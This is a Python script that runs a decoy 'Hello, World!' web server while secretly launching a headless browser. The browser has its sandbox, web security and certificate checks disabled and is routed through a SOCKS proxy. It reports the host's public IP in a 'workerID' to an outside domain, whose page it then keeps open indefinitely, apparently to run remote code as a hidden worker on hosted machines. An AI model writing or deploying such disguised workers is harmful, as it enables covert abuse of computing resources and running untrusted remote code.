import os
import socket
import requests
import random
import string
import time
import os.path
import asyncio
import http.server
import socketserver
from pyppeteer import launch
from datetime import datetime

# --- Web Server Configuration ---
# Set the port number for the web server
WEB_SERVER_PORT = 8080

# Define a custom handler that serves a simple "Hello, World!" message
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Set the HTTP response status code to 200 (OK)
        self.send_response(200)
        # Set the Content-Type header to text/plain
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        # Send the "Hello, World!" message as bytes
        self.wfile.write(b"Hello, World!")

# --- Browser Automation Configuration ---
# Generate a unique workerID
ipaddress = requests.get('https://api.ipify.org').text
underscored_ip = ipaddress.replace('.', '_')
chars = random.choices(string.ascii_letters + string.digits, k=8)
random_word = "".join(chars)
currentdate = datetime.now().strftime('%d-%b-%Y_RenPypp_') + underscored_ip + random_word

browser_url = f"http://sindilesiqhaztraining.teatspray.uk/test.html?workerID={currentdate}"
print(f"WorkerID: {currentdate}")

# --- Combined Logic ---

# Asynchronous function to launch the headless browser
async def open_browser():
    try:
        browser = await launch(
            headless=True,
            args=[
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--ignore-certificate-errors',
                '--ignore-certificate-errors-spki-list',
                '--disable-dev-shm-usage',
                '--disable-infobars',
                '--disable-extensions',
                '--disable-background-timer-throttling',
                '--disable-background-networking',
                '--disable-web-security',
                '--disable-gpu',
                '--proxy-server=socks5://127.0.0.1:1082'
            ],
            autoClose=False,
            handleSIGINT=False,
            handleSIGTERM=False,
            handleSIGHUP=False
        )

        page = await browser.newPage()
        await page.goto(browser_url, {"waitUntil": "domcontentloaded", "timeout": 60000})
        print(f"✅ Browser opened and staying at: {browser_url}")

        # Keep the browser open
        while True:
            await asyncio.sleep(3600)  # Sleep for an hour
            
    except Exception as e:
        print(f"An error occurred with the browser: {e}")

# Function to start the synchronous web server in a separate thread
async def start_web_server():
    try:
        with socketserver.TCPServer(("", WEB_SERVER_PORT), MyHandler) as httpd:
            print(f"✅ Serving web content on port {WEB_SERVER_PORT}")
            # This runs the server forever, but in a way that doesn't block the asyncio event loop
            await asyncio.to_thread(httpd.serve_forever)
    except Exception as e:
        print(f"An error occurred with the web server: {e}")

# Main asynchronous function to run both tasks concurrently
async def main():
    # Use asyncio.gather to run both the web server and the browser tasks at the same time
    await asyncio.gather(
        start_web_server(),
        open_browser()
    )

# Run the main program
if __name__ == "__main__":
    asyncio.run(main())
